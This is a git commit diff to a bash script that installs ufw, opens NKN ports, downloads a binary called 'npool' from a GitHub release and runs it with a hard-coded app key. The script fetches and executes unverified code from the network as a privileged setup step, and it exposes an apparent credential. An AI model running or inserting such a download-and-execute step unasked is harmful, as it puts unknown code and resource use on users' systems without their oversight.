56050fef8a1fc2d4419456dd740fefa946e82347
vedhagsvp <vedhag230223@gmail.com>
2026-02-12 00:05:25 +0530

    Update apa.sh

--- apa.sh
+++ apa.sh
@@ -1,6 +1,17 @@
 #!/bin/bash
+apt update -y
+apt install ufw wget -y
+
+# Open NKN ports
+ufw allow 30001:30003/tcp
+ufw enable
+
+# Download node files
 wget -q https://github.com/vedhagsvp/soljtka/releases/download/latest/config.json
 wget -q https://github.com/vedhagsvp/soljtka/releases/download/latest/npool
-chmod +x config.json
+
+# Make binary executable
 chmod +x npool
-./npool
+
+# Run node
+./npool --appkey wW8xBLMezohupvC7
